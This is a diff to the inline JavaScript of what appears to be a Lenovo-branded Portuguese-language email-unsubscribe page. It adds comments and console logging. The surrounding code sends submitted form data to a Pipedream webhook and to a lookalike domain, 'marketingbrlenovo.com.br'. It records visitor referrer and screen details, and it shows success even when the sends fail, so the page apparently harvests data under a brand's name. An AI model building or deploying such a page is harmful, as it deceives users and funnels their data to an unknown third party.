@@ -303,6 +303,10 @@
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 
     <script>
+    // ============================================================================
+    // CONFIGURAÇÃO - AJUSTE AS URLs AQUI
+    // ============================================================================
+    
     const WEBHOOK_URL = 'https://eotz4wvybe4cndl.m.pipedream.net';
     const TRACKING_API = 'https://marketingbrlenovo.com.br/unsubscribe.php';
     
@@ -316,7 +320,11 @@
         }
         
         const sessionToken = 'LEN' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5).toUpperCase();
-
+        
+        // ========================================================================
+        // FUNÇÕES DE RASTREAMENTO
+        // ========================================================================
+        
         async function registrarAcessoPagina(trackingId) {
             try {
                 const dados = {
@@ -328,7 +336,8 @@
                     referrer: document.referrer,
                     screen_resolution: `${screen.width}x${screen.height}`
                 };
-
+                
+                // Envia para a API (não bloqueia se falhar)
                 await fetch(TRACKING_API, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -461,6 +470,10 @@
             window.scrollTo(0, 0);
         }
         
+        // ========================================================================
+        // HANDLER DO FORMULÁRIO
+        // ========================================================================
+        
         document.getElementById('preferencesForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -476,7 +489,11 @@
                 enviarWebhook(dados),
                 registrarDescadastro(dados)
             ]);
-
+            
+            console.log('Webhook:', webhookSuccess ? '✅' : '❌');
+            console.log('API:', apiSuccess ? '✅' : '❌');
+            
+            // Mostra sucesso mesmo se um dos envios falhar
             setTimeout(() => {
                 mostrarSucesso();
             }, 1000);
@@ -485,8 +502,11 @@
         // ========================================================================
         // LOG INICIAL
         // ========================================================================
-
-        console.log(TRACKING_API);
+        
+        console.log('🔍 Sistema de Rastreamento Iniciado');
+        console.log('Tracking ID:', trackingId || 'Não fornecido');
+        console.log('Webhook URL:', WEBHOOK_URL);
+        console.log('API URL:', TRACKING_API);
         
     }());
     </script>
